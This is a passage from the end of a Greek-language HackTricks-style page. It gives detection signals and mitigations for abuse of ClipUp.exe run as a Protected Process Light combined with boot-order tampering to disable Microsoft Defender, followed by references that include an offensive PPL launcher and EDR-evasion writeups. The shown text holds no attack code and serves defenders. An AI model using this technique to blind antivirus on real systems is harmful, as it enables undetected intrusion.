- Δημιουργία διεργασίας του `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν έχει ως γονέα μη-τυπικούς εκκινητές, γύρω από την εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες για auto-start ύποπτων binaries και που ξεκινούν σταθερά πριν το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσίας πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων στα Defender binaries/Platform directories· απροσδόκητες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- ETW/EDR τηλεμετρία: αναζητήστε διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανωμαλίες στη χρήση επιπέδων PPL από μη-AV binaries.

Mitigations
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να τρέξουν ως PPL και υπό ποιους γονείς· μπλοκάρετε την κλήση του ClipUp εκτός νόμιμων πλαισίων.
- Υγιεινή υπηρεσιών: περιορίστε τη δημιουργία/τροποποίηση υπηρεσιών auto-start και παρακολουθήστε χειραγώγηση της σειράς εκκίνησης.
- Εξασφαλίστε ότι το Defender tamper protection και τα early-launch protections είναι ενεργοποιημένα· διερευνήστε σφάλματα εκκίνησης που υποδεικνύουν καταστροφή δυαδικών αρχείων.
- Σκεφτείτε να απενεργοποιήσετε τη δημιουργία σύντομων ονομάτων 8.3 σε volumes που φιλοξενούν εργαλεία ασφάλειας, εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
